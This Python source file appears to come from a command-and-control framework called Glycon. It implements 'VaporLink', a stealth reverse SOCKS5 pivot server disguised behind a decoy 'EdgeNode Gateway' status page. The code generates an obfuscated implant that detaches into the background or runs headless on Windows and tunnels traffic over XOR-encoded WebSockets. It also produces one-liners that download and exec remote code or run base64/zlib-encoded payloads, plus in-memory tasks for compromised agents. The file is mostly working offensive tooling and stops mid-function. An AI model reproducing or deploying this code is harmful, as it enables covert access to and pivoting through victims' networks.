import asyncio
import base64
import hashlib
import hmac
import itertools
import json
import mimetypes
import os
import secrets
import socket
import sqlite3
import ssl
import struct
import threading
import time
import urllib.parse
from collections import deque
from datetime import datetime
from glycon.config import CONFIG

# Binary Protocol Commands (VaporLink v2.1)
CMD_CONNECT = 1
CMD_CONNECT_OK = 2
CMD_CONNECT_FAIL = 3
CMD_DATA = 4
CMD_CLOSE = 5
CMD_EXIT = 255

DEFAULT_DECOY_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EdgeNode Gateway — System Status</title>
    <style>
        :root {
            --bg: #0b0f19;
            --card: #111827;
            --border: #1f2937;
            --text: #f3f4f6;
            --muted: #9ca3af;
            --accent: #10b981;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 1.5rem;
        }
        .container {
            max-width: 540px;
            width: 100%;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 2rem;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid var(--border);
            padding-bottom: 1.25rem;
            margin-bottom: 1.5rem;
        }
        .title { font-size: 1.15rem; font-weight: 600; letter-spacing: -0.01em; }
        .badge {
            display: inline-flex;
            align-items: center;
            gap: 0.45rem;
            background: rgba(16, 185, 129, 0.12);
            color: var(--accent);
            font-size: 0.8rem;
            font-weight: 600;
            padding: 0.35rem 0.75rem;
            border-radius: 9999px;
            border: 1px solid rgba(16, 185, 129, 0.25);
        }
        .dot {
            width: 8px;
            height: 8px;
            background-color: var(--accent);
            border-radius: 50%;
            box-shadow: 0 0 8px var(--accent);
        }
        .metrics {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 1rem;
            margin-bottom: 1.5rem;
        }
        .metric {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1rem;
        }
        .metric-label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.05em; }
        .metric-val { font-size: 1.1rem; font-weight: 600; margin-top: 0.35rem; }
        .footer {
            font-size: 0.8rem;
            color: var(--muted);
            text-align: center;
            padding-top: 1rem;
            border-top: 1px solid var(--border);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="title">EdgeNode Telemetry Gateway</div>
            <div class="badge"><span class="dot"></span> Operational</div>
        </div>
        <div class="metrics">
            <div class="metric">
                <div class="metric-label">API Ingress</div>
                <div class="metric-val">Healthy (99.99%)</div>
            </div>
            <div class="metric">
                <div class="metric-label">TLS Termination</div>
                <div class="metric-val">TLS 1.3 Active</div>
            </div>
            <div class="metric">
                <div class="metric-label">Stream Engine</div>
                <div class="metric-val">Async v2.4</div>
            </div>
            <div class="metric">
                <div class="metric-label">Region</div>
                <div class="metric-val">eu-north-1</div>
            </div>
        </div>
        <div class="footer">
            EdgeNode Core Infrastructure &bull; All services running normally.
        </div>
    </div>
</body>
</html>
"""


def xor_data(data: bytes, key: bytes) -> bytes:
    if not data or not key:
        return b""
    n = len(data)
    k = (key * ((n // len(key)) + 1))[:n]
    return (int.from_bytes(data, "big") ^ int.from_bytes(k, "big")).to_bytes(n, "big")


def encode_ws_frame(payload: bytes, opcode: int = 2) -> bytes:
    n = len(payload)
    out = bytearray([0x80 | opcode])
    if n < 126:
        out.append(n)
    elif n < 65536:
        out.append(126)
        out.extend(struct.pack(">H", n))
    else:
        out.append(127)
        out.extend(struct.pack(">Q", n))
    out.extend(payload)
    return bytes(out)


async def read_ws_msg(reader: asyncio.StreamReader, writer: asyncio.StreamWriter, wl: asyncio.Lock):
    fragments = []
    while True:
        hdr = await reader.readexactly(2)
        fin = hdr[0] & 0x80
        opcode = hdr[0] & 0x0F
        masked = hdr[1] & 0x80
        length = hdr[1] & 0x7F
        if length == 126:
            length, = struct.unpack(">H", await reader.readexactly(2))
        elif length == 127:
            length, = struct.unpack(">Q", await reader.readexactly(8))
        mask = await reader.readexactly(4) if masked else None
        payload = await reader.readexactly(length) if length else b""
        if masked and payload:
            payload = xor_data(payload, mask)
        if opcode == 8:
            return None
        if opcode == 9:
            async with wl:
                writer.write(encode_ws_frame(payload, 10))
                await writer.drain()
            continue
        if opcode == 10:
            continue
        if opcode in (1, 2):
            fragments = [payload]
            if fin:
                return b"".join(fragments)
        elif opcode == 0:
            fragments.append(payload)
            if fin:
                return b"".join(fragments)


class VaporSession:
    """Represents a single connected VaporLink SOCKS5 pivot client."""

    def __init__(self, session_id: str, writer: asyncio.StreamWriter, client_ip: str,
                 agent_id: str = "", hostname: str = "", os_info: str = "",
                 source_type: str = "standalone"):
        self.session_id = session_id
        self.writer = writer
        self.lock = asyncio.Lock()
        self.client_ip = client_ip
        self.agent_id = agent_id
        self.hostname = hostname or client_ip
        self.os_info = os_info or "Unknown"
        self.source_type = source_type
        self.connected_since = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.connected_ts = time.time()
        self.bytes_tx = 0
        self.bytes_rx = 0
        self.streams = {}
        self.pending_connects = {}
        self.sid_counter = itertools.count(1)
        self.dedicated_socks_port = None
        self.dedicated_socks_server = None
        self.closed = False

    def to_dict(self, primary_session_id: str, socks_ip: str, primary_socks_port: int) -> dict:
        return {
            "session_id": self.session_id,
            "client_ip": self.client_ip,
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "os_info": self.os_info,
            "source_type": self.source_type,
            "connected_since": self.connected_since,
            "uptime_seconds": int(time.time() - self.connected_ts),
            "active_streams": len(self.streams),
            "bytes_tx": self.bytes_tx,
            "bytes_rx": self.bytes_rx,
            "dedicated_socks_port": self.dedicated_socks_port,
            "dedicated_socks_bind": f"{socks_ip}:{self.dedicated_socks_port}" if self.dedicated_socks_port else None,
            "is_primary": self.session_id == primary_session_id,
            "primary_socks_bind": f"{socks_ip}:{primary_socks_port}" if self.session_id == primary_session_id else None,
        }


class VaporLinkManager:
    """
    Integrated Multi-Session VaporLink v2.1 Stealth SOCKS5 Pivot & Webserver Engine.
    Runs an independent asyncio event loop in a dedicated daemon thread.
    """

    def __init__(self):
        self.base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
        self.web_root = os.path.join(self.base_dir, "uploads", "vaporlink_www")
        os.makedirs(self.web_root, exist_ok=True)
        index_path = os.path.join(self.web_root, "index.html")
        if not os.path.exists(index_path):
            with open(index_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_DECOY_HTML)

        self.logs = deque(maxlen=250)
        self.failed_attempts = {}
        self.sessions = {}  # session_id -> VaporSession
        self.primary_session_id = None
        self.total_bytes_tx = 0
        self.total_bytes_rx = 0

        self.loop = None
        self.thread = None
        self.ws_server = None
        self.primary_socks_server = None
        self.running = False
        self.listener_error = None

        self._init_db()
        self.config = self._load_config()

    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _init_db(self):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS vaporlink_settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS vaporlink_bans (
                ip TEXT PRIMARY KEY,
                reason TEXT,
                banned_at TEXT
            )
        ''')

        # Seed defaults if not present
        alnum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        default_xor = "".join(secrets.choice(alnum) for _ in range(16))
        default_token = "".join(secrets.choice(alnum) for _ in range(32))

        # Check if an agent_configurations server_url exists to infer hostname
        default_host = self._get_local_ip()
        try:
            c.execute("SELECT server_url FROM agent_configurations ORDER BY id DESC LIMIT 1")
            row = c.fetchone()
            if row and row[0]:
                parsed = urllib.parse.urlparse(row[0])
                if parsed.hostname:
                    default_host = parsed.hostname
        except Exception:
            pass

        cert_path = os.path.join(self.base_dir, "cert.pem")
        key_path = os.path.join(self.base_dir, "key.pem")
        has_certs = os.path.isfile(cert_path) and os.path.isfile(key_path)

        defaults = {
            "xor_key": default_xor,
            "conn_token": default_token,
            "ws_link": f"{default_host}:9443/api",
            "ws_ip": "0.0.0.0",
            "ws_port": "9443",
            "socks_ip": "127.0.0.1",
            "socks_port": "1080",
            "web_server": "on",
            "tls_enabled": "on" if has_certs else "off",
            "ssl_cert": cert_path if has_certs else "",
            "ssl_key": key_path if has_certs else "",
        }
        for k, v in defaults.items():
            c.execute("INSERT OR IGNORE INTO vaporlink_settings (key, value) VALUES (?, ?)", (k, v))

        conn.commit()
        conn.close()

    def _load_config(self) -> dict:
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT key, value FROM vaporlink_settings")
        rows = dict(c.fetchall())
        conn.close()

        cert_path = rows.get("ssl_cert", "") or os.path.join(self.base_dir, "cert.pem")
        key_path = rows.get("ssl_key", "") or os.path.join(self.base_dir, "key.pem")
        tls_flag = rows.get("tls_enabled", "on").lower() in ("on", "true", "1", "yes")
        tls_active = bool(tls_flag and os.path.isfile(cert_path) and os.path.isfile(key_path))

        try:
            ws_port = int(rows.get("ws_port", "8443"))
        except ValueError:
            ws_port = 8443

        try:
            socks_port = int(rows.get("socks_port", "1080"))
        except ValueError:
            socks_port = 1080

        return {
            "xor_key": rows.get("xor_key", "DefaultKey123456"),
            "conn_token": rows.get("conn_token", "DefaultToken12345678901234567890"),
            "ws_link": rows.get("ws_link", f"{self._get_local_ip()}:{ws_port}/api"),
            "ws_ip": rows.get("ws_ip", "0.0.0.0"),
            "ws_port": ws_port,
            "socks_ip": rows.get("socks_ip", "127.0.0.1"),
            "socks_port": socks_port,
            "web_server": rows.get("web_server", "on").lower() in ("on", "true", "1", "yes"),
            "tls_enabled": tls_active,
            "ssl_cert": cert_path,
            "ssl_key": key_path,
            "web_root": self.web_root,
        }

    def save_config(self, updates: dict) -> dict:
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        for k, v in updates.items():
            c.execute("INSERT OR REPLACE INTO vaporlink_settings (key, value) VALUES (?, ?)", (k, str(v).strip()))
        conn.commit()
        conn.close()
        self.config = self._load_config()
        return self.config

    def rotate_keys(self) -> dict:
        alnum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        new_xor = "".join(secrets.choice(alnum) for _ in range(16))
        new_token = "".join(secrets.choice(alnum) for _ in range(32))
        self.save_config({"xor_key": new_xor, "conn_token": new_token})
        self.log("SECURITY", "Rotated 16-byte XOR key and 32-byte Connection Token.")
        self.restart_listeners()
        return self.config

    def log(self, level: str, message: str):
        entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "level": level.upper(),
            "message": message,
        }
        self.logs.append(entry)
        print(f"[VaporLink][{entry['level']}] {message}", flush=True)

    def get_banned_ips(self) -> list:
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT ip, reason, banned_at FROM vaporlink_bans ORDER BY banned_at DESC")
        rows = [{"ip": r[0], "reason": r[1], "banned_at": r[2]} for r in c.fetchall()]
        conn.close()
        return rows

    def is_ip_banned(self, ip: str) -> bool:
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT 1 FROM vaporlink_bans WHERE ip = ?", (ip,))
        found = c.fetchone() is not None
        conn.close()
        return found

    def ban_ip(self, ip: str, reason: str = "Manual operator ban"):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute(
            "INSERT OR REPLACE INTO vaporlink_bans (ip, reason, banned_at) VALUES (?, ?, ?)",
            (ip.strip(), reason, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
        conn.close()
        self.log("SECURITY", f"Banned IP {ip} ({reason})")
        # Kick any active sessions from this IP
        if self.loop and self.loop.is_running():
            for sid, sess in list(self.sessions.items()):
                if sess.client_ip == ip.strip():
                    asyncio.run_coroutine_threadsafe(self._close_session(sess, "IP Banned"), self.loop)

    def unban_ip(self, ip: str):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("DELETE FROM vaporlink_bans WHERE ip = ?", (ip.strip(),))
        conn.commit()
        conn.close()
        self.failed_attempts.pop(ip.strip(), None)
        self.log("INFO", f"Removed {ip} from ban list.")

    def get_decoy_html(self) -> str:
        index_path = os.path.join(self.web_root, "index.html")
        try:
            if os.path.isfile(index_path):
                with open(index_path, "r", encoding="utf-8") as f:
                    return f.read()
        except Exception:
            pass
        return DEFAULT_DECOY_HTML

    def save_decoy_html(self, html_content: str = "", reset_default: bool = False) -> str:
        os.makedirs(self.web_root, exist_ok=True)
        index_path = os.path.join(self.web_root, "index.html")
        content = DEFAULT_DECOY_HTML if (reset_default or not html_content.strip()) else html_content
        with open(index_path, "w", encoding="utf-8") as f:
            f.write(content)
        self.log("INFO", "Updated Decoy Webserver root HTML (index.html).")
        return content

    # ------------------------------------------------------------------
    # Payload & One-Liner Builders (100% Pure Python Stdlib)
    # ------------------------------------------------------------------
    def build_agent_script(self, insecure: bool = True, agent_id: str = "", custom_link: str = "") -> bytes:
        cfg = self.config
        xor_key_str = cfg["xor_key"]
        auth_token = cfg["conn_token"]
        ws_link = (custom_link or cfg["ws_link"]).strip()
        scheme_default = "wss://" if cfg["tls_enabled"] else "ws://"

        code = f'''import asyncio,base64,hashlib,os,platform,socket,ssl,struct,subprocess,sys,urllib.parse
_ed=os.path.dirname(os.path.abspath(sys.executable))
if os.path.isdir(_ed):
 try:os.chdir(_ed)
 except:pass
 if _ed not in sys.path:sys.path.insert(0,_ed)
if ("bg" in sys.argv[1:] or os.environ.get("_VL_BG")=="1") and os.environ.get("_VL_BG")!="2":
 os.environ["_VL_BG"]="2"
 if hasattr(os,"fork"):
  if os.fork()>0:os._exit(0)
  os.setsid()
  if os.fork()>0:os._exit(0)
  dn=os.open(os.devnull,os.O_RDWR)
  for fd in (0,1,2):
   try:os.dup2(dn,fd)
   except:pass
  if dn>2:os.close(dn)
 elif "_c" in globals():
  _pw=os.path.join(_ed,"pythonw.exe")
  if not os.path.exists(_pw):_pw=r"C:\\Users\\Public\\Documents\\pythonw.exe" if os.path.exists(r"C:\\Users\\Public\\Documents\\pythonw.exe") else sys.executable
  _pd=os.path.dirname(os.path.abspath(_pw))
  subprocess.Popen([_pw,"-c",_c.decode() if isinstance(_c,bytes) else _c],cwd=_pd if os.path.isdir(_pd) else None,env=os.environ,stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,close_fds=True,creationflags=0x08000008);sys.exit(0)
K,T,U,INS,AID=b"{xor_key_str}","{auth_token}","{ws_link}",{repr(bool(insecure))},"{agent_id}"
def X(d,k=K):
 if not d:return b""
 n=len(d);fk=(k*((n//len(k))+1))[:n]
 return (int.from_bytes(d,"big")^int.from_bytes(fk,"big")).to_bytes(n,"big")
def F(p,op=2):
 n=len(p);m=os.urandom(4);o=bytearray([0x80|op])
 if n<126:o.append(0x80|n)
 elif n<65536:o.append(0x80|126);o.extend(struct.pack(">H",n))
 else:o.append(0x80|127);o.extend(struct.pack(">Q",n))
 o.extend(m)
 if n:o.extend(X(p,m))
 return bytes(o)
async def R(r,w,wl):
 fg=[]
 while True:
  h=await r.readexactly(2);fin,op,m,ln=h[0]&128,h[0]&15,h[1]&128,h[1]&127
  if ln==126:ln,=struct.unpack(">H",await r.readexactly(2))
  elif ln==127:ln,=struct.unpack(">Q",await r.readexactly(8))
  mk=await r.readexactly(4) if m else None
  p=await r.readexactly(ln) if ln else b""
  if m and p:p=X(p,mk)
  if op==8:return None
  if op==9:
   async with wl:w.write(F(p,10));await w.drain()
   continue
  if op==10:continue
  if op in (1,2):
   fg=[p]
   if fin:return b"".join(fg)
  elif op==0:
   fg.append(p)
   if fin:return b"".join(fg)
async def S(u,stop_ev=None):
 if "://" not in u:u="{scheme_default}"+u
 p=urllib.parse.urlparse(u);sc=p.scheme in ("wss","https")
 h=p.hostname;pt=p.port or (443 if sc else 80);pa=p.path or "/"
 if p.query:pa+="?"+p.query
 hh=h if pt in (80,443) else f"{{h}}:{{pt}}"
 ctx=(ssl._create_unverified_context() if INS else ssl.create_default_context()) if sc else None
 hn=socket.gethostname();osn=f"{{platform.system()}} {{platform.release()}}"
 while not (stop_ev and stop_ev.is_set()):
  st={{}};wl=asyncio.Lock()
  try:
   r,w=await asyncio.wait_for(asyncio.open_connection(h,pt,ssl=ctx,server_hostname=h if sc else None),10)
   ky=base64.b64encode(os.urandom(16)).decode()
   w.write(f"GET {{pa}} HTTP/1.1\\r\\nHost: {{hh}}\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: {{ky}}\\r\\nSec-WebSocket-Version: 13\\r\\nX-Vapor-Token: {{T}}\\r\\nX-Vapor-Host: {{hn}}\\r\\nX-Vapor-OS: {{osn}}\\r\\nX-Vapor-Agent: {{AID}}\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\n\\r\\n".encode())
   await w.drain()
   res=await asyncio.wait_for(r.readuntil(b"\\r\\n\\r\\n"),10)
   if b" 101 " not in res.split(b"\\r\\n",1)[0]:w.close();await asyncio.sleep(8);continue
   async def tx(sid,c,d=b""):
    try:
     async with wl:w.write(F(X(struct.pack(">IB",sid,c)+d)));await w.drain()
    except:pass
   async def pipe(sid,sr,sw):
    try:
     while True:
      d=await sr.read(32768)
      if not d:break
      await tx(sid,4,d)
    except:pass
    finally:
     st.pop(sid,None);sw.close();await tx(sid,5)
   async def conn(sid,pl):
    try:
     tpt,=struct.unpack(">H",pl[:2]);th=pl[2:].decode("utf-8","ignore")
     sr,sw=await asyncio.wait_for(asyncio.open_connection(th,tpt),6)
     st[sid]=sw;await tx(sid,2);asyncio.create_task(pipe(sid,sr,sw))
    except:await tx(sid,3)
   while not (stop_ev and stop_ev.is_set()):
    try:
     m=await asyncio.wait_for(R(r,w,wl),2.0)
    except asyncio.TimeoutError:
     continue
    if m is None:break
    m=X(m)
    if len(m)<5:continue
    sid,c=struct.unpack(">IB",m[:5]);pl=m[5:]
    if c==1:asyncio.create_task(conn(sid,pl))
    elif c==4 and sid in st:
     try:st[sid].write(pl);await st[sid].drain()
     except:
      sw=st.pop(sid,None)
      if sw:sw.close()
    elif c==5 and sid in st:
     sw=st.pop(sid,None)
     if sw:sw.close()
    elif c==255:
     for sw in list(st.values()):
      try:sw.close()
      except:pass
     try:w.close()
     except:pass
     os._exit(0)
  except:pass
  finally:
   for sw in list(st.values()):
    try:sw.close()
    except:pass
   st.clear()
  if stop_ev and stop_ev.is_set():break
  await asyncio.sleep(8)
if __name__=="__main__" or "_VL_DIRECT" in globals():
 _ua=next((a for a in sys.argv[1:] if a and a!="bg"),U)
 asyncio.run(S(_ua))
'''
        return code.encode("utf-8")

    def generate_oneliners(self, insecure: bool = True, custom_link: str = "") -> dict:
        import zlib
        cfg = self.config
        ws_link = (custom_link or cfg["ws_link"]).strip()
        for prefix in ("https://", "http://", "wss://", "ws://"):
            if ws_link.startswith(prefix):
                ws_link = ws_link[len(prefix):]

        agent_bytes = self.build_agent_script(insecure=insecure, custom_link=ws_link)
        compressed_b64 = base64.b64encode(zlib.compress(agent_bytes, 9)).decode("ascii")

        http_scheme = "https" if cfg["tls_enabled"] else "http"
        ws_scheme = "wss" if cfg["tls_enabled"] else "ws"

        ssl_snippet = ";ctx=ssl._create_unverified_context()" if (insecure and cfg["tls_enabled"]) else ";ctx=None"
        ssl_arg = ",context=ctx" if (insecure and cfg["tls_enabled"]) else ""
        ssl_imp = ",ssl" if (insecure and cfg["tls_enabled"]) else ""
        token = cfg["conn_token"]
        hdr_dict = f'{{"X-Vapor-Token":"{token}","X-Vapor-Mode":"stage","X-Vapor-SSL":"{"0" if insecure else "1"}","Upgrade":"websocket","Connection":"Upgrade"}}'

        staged_fg = f'python3 -c \'import urllib.request as u{ssl_imp}{ssl_snippet};_VL_DIRECT=1;exec(_c:=u.urlopen(u.Request("{http_scheme}://{ws_link}",headers={hdr_dict}){ssl_arg}).read())\''
        staged_bg = f'{staged_fg} bg'
        standalone_fg = f'python3 -c "import base64,zlib;_VL_DIRECT=1;exec(_c:=zlib.decompress(base64.b64decode(\'{compressed_b64}\')))"'
        standalone_bg = f'{standalone_fg} bg'
        windows_cmd = f'cd /d C:\\Users\\Public\\Documents && start /b pythonw.exe -c "import base64,zlib;_VL_DIRECT=1;exec(_c:=zlib.decompress(base64.b64decode(\'{compressed_b64}\')))"'

        loc_path = "/" + ws_link.split("/", 1)[1] if "/" in ws_link else "/api"
        ws_ip = cfg["ws_ip"] if cfg["ws_ip"] != "0.0.0.0" else "127.0.0.1"
        ws_port = cfg["ws_port"]
        backend_proto = "https" if cfg["tls_enabled"] else "http"

        nginx_cfg = f"""location / {{
    proxy_pass {backend_proto}://{ws_ip}:{ws_port};
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "Upgrade";
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_read_timeout 86400s;
    proxy_send_timeout 86400s;
}}"""

        apache_cfg = f"""<Location />
    ProxyPreserveHost On
    ProxyAddHeaders On
    ProxyPass {backend_proto}://{ws_ip}:{ws_port}/ upgrade=websocket
    ProxyPassReverse {backend_proto}://{ws_ip}:{ws_port}/
</Location>"""

        return {
            "endpoint": f"{ws_scheme}://{ws_link}",
            "http_endpoint": f"{http_scheme}://{ws_link}",
            "insecure": insecure,
            "staged_fg": staged_fg,
            "staged_bg": staged_bg,
            "standalone_fg": standalone_fg,
            "standalone_bg": standalone_bg,
            "windows_cmd": windows_cmd,
            "nginx_config": nginx_cfg,
            "apache_config": apache_cfg,
            "loc_path": loc_path,
        }

    def build_agent_memory_task(self, action: str, agent_id: str) -> str:
        """
        Builds an in-memory Python payload for Glycon's execute_python task type.
        On Windows Glycon agents, launches the VaporLink client as a headless pythonw.exe
        process directly from the agent's existing Windows Python directory (e.g. C:\\Users\\Public\\Documents).
        """
        import zlib
        if action == "stop":
            return """
import os, subprocess, sys
stopped = False
proc = getattr(sys, '_glycon_vl_proc', None)
pid = getattr(sys, '_glycon_vl_pid', None)
if proc is not None:
    try:
        proc.kill()
        stopped = True
    except Exception:
        pass
if pid and os.name == 'nt':
    try:
        subprocess.run(['taskkill', '/F', '/PID', str(pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
        stopped = True
    except Exception:
        pass
sys._glycon_vl_proc = None
sys._glycon_vl_pid = None

ev = getattr(sys, '_glycon_vl_stop', None)
if ev is not None:
    try:
        ev.set()
        stopped = True
    except Exception:
        pass
    sys._glycon_vl_stop = None
    sys._glycon_vl_thread = None

result = "VaporLink headless pythonw client stopped." if stopped else "VaporLink reverse SOCKS5 pivot was not running."
"""
        agent_bytes = self.build_agent_script(insecure=True, agent_id=agent_id)
        compressed_b64 = base64.b64encode(zlib.compress(agent_bytes, 9)).decode("ascii")
        b64_script = base64.b64encode(agent_bytes).decode("ascii")
        return f"""
import asyncio, base64, os, subprocess, sys, threading

# Terminate any previous VaporLink process/thread first
old_proc = getattr(sys, '_glycon_vl_proc', None)
old_pid = getattr(sys, '_glycon_vl_pid', None)
if old_proc is not None:
    try:
        old_proc.kill()
    except Exception:
        pass
if old_pid and os.name == 'nt':
    try:
        subprocess.run(['taskkill', '/F', '/PID', str(old_pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
    except Exception:
        pass
ev_old = getattr(sys, '_glycon_vl_stop', None)
if ev_old is not None:
    try:
        ev_old.set()
    except Exception:
        pass

if os.name == 'nt':
    candidates = [
        os.path.join(os.path.dirname(os.path.abspath(sys.executable)), "pythonw.exe"),
        r"C:\\Users\\Public\\Documents\\pythonw.exe",
        os.path.join(os.environ.get("PUBLIC", r"C:\\Users\\Public"), "Documents", "pythonw.exe"),
        sys.executable
    ]
    pyw = next((p for p in candidates if p and os.path.exists(p)), sys.executable)
    py_dir = os.path.dirname(os.path.abspath(pyw))
    inline_cmd = "import base64,zlib;_VL_DIRECT=1;exec(_c:=zlib.decompress(base64.b64decode('{compressed_b64}')))"
    CREATE_NO_WINDOW = 0x08000000
    proc = subprocess.Popen(
        [pyw, "-c", inline_cmd],
        cwd=py_dir if os.path.isdir(py_dir) else None,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        close_fds=True,
        creationflags=CREATE_NO_WINDOW
    )
    sys._glycon_vl_proc = proc
    sys._glycon_vl_pid = proc.pid
    result = f"VaporLink headless client started via {{pyw}} (cwd={{py_dir}}, PID={{proc.pid}}) -> {self.config['ws_link']}"
else:
    stop_ev = threading.Event()
    sys._glycon_vl_stop = stop_ev
    raw_code = base64.b64decode("{b64_script}").decode("utf-8")

    def _vl_worker():
        ns = {{"__name__": "__vaporlink_embedded__"}}
        exec(raw_code, ns)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(ns["S"](ns["U"], stop_ev))
        except Exception:
            pass
        finally:
            try:
                loop.close()
            except Exception:
                pass

    t = threading.Thread(target=_vl_worker, name="GlyconVaporLinkPivot", daemon=True)
    t.start()
    sys._glycon_vl_thread = t
    result = f"VaporLink reverse SOCKS5 pivot started -> {self.config['ws_link']}"
"""

    # ------------------------------------------------------------------
    # Asyncio Server Methods (SOCKS5 + WS/WSS + Decoy Webserver + Stager)
    # ------------------------------------------------------------------
    async def _send_packet(self, session: VaporSession, sid: int, cmd: int, data: bytes = b"") -> bool:
        if session.closed or not session.writer:
            return False
        xor_key = self.config["xor_key"].encode("utf-8")
        raw = xor_data(struct.pack(">IB", sid, cmd) + data, xor_key)
        frame = encode_ws_frame(raw, 2)
        try:
            async with session.lock:
                if session.closed or not session.writer:
                    return False
                session.writer.write(frame)
                await session.writer.drain()
            session.bytes_tx += len(data)
            self.total_bytes_tx += len(data)
            return True
        except Exception:
            return False

    async def _handle_socks_for_session(self, session: VaporSession, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        if not session or session.closed:
            writer.close()
            return
        sid = next(session.sid_counter) & 0xFFFFFFFF
        if sid == 0:
            sid = next(session.sid_counter) & 0xFFFFFFFF
        try:
            ver, nmethods = await asyncio.wait_for(reader.readexactly(2), timeout=10.0)
            if ver != 5:
                writer.close()
                return
            await asyncio.wait_for(reader.readexactly(nmethods), timeout=10.0)
            writer.write(b"\x05\x00")
            await writer.drain()

            ver, cmd, rsv, atyp = await asyncio.wait_for(reader.readexactly(4), timeout=10.0)
            if ver != 5 or cmd != 1:
                writer.write(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
                await writer.drain()
                writer.close()
                return
            if atyp == 1:
                host = socket.inet_ntoa(await asyncio.wait_for(reader.readexactly(4), timeout=10.0))
            elif atyp == 3:
                dlen = (await asyncio.wait_for(reader.readexactly(1), timeout=10.0))[0]
                host = (await asyncio.wait_for(reader.readexactly(dlen), timeout=10.0)).decode("utf-8", "ignore")
            elif atyp == 4:
                host = socket.inet_ntop(socket.AF_INET6, await asyncio.wait_for(reader.readexactly(16), timeout=10.0))
            else:
                writer.close()
                return
            port, = struct.unpack(">H", await asyncio.wait_for(reader.readexactly(2), timeout=10.0))

            loop = asyncio.get_running_loop()
            fut = loop.create_future()
            session.pending_connects[sid] = fut
            session.streams[sid] = writer

            if not await self._send_packet(session, sid, CMD_CONNECT, struct.pack(">H", port) + host.encode("utf-8")):
                writer.close()
                return

            ok = await asyncio.wait_for(fut, timeout=10.0)
            if not ok:
                writer.write(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                await writer.drain()
                writer.close()
                return

            writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()

            while not session.closed:
                data = await asyncio.wait_for(reader.read(32768), timeout=120.0)
                if not data:
                    break
                if not await self._send_packet(session, sid, CMD_DATA, data):
                    break
        except Exception:
            pass
        finally:
            session.pending_connects.pop(sid, None)
            if sid in session.streams:
                del session.streams[sid]
                await self._send_packet(session, sid, CMD_CLOSE)
            try:
                writer.close()
            except Exception:
                pass

    async def _handle_primary_socks(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        session = self.sessions.get(self.primary_session_id)
        if not session and self.sessions:
            # Automatically select first available session if primary disconnected
            first_sid = next(iter(self.sessions))
            self.primary_session_id = first_sid
            session = self.sessions[first_sid]
        if not session or session.closed:
            writer.close()
            return
        await self._handle_socks_for_session(session, reader, writer)

    async def _allocate_dedicated_socks_server(self, session: VaporSession):
        socks_ip = self.config["socks_ip"]
        base_port = self.config["socks_port"] + 1
        used_ports = {s.dedicated_socks_port for s in self.sessions.values() if s.dedicated_socks_port}
        for candidate in range(base_port, base_port + 200):
            if candidate in used_ports:
                continue
            try:
                srv = await asyncio.start_server(
                    lambda r, w, s=session: self._handle_socks_for_session(s, r, w),
                    socks_ip,
                    candidate
                )
                session.dedicated_socks_port = candidate
                session.dedicated_socks_server = srv
                return
            except OSError:
                continue

    async def _keepalive_ping(self, session: VaporSession):
        try:
            while not session.closed:
                await asyncio.sleep(20)
                async with session.lock:
                    if session.closed:
                        break
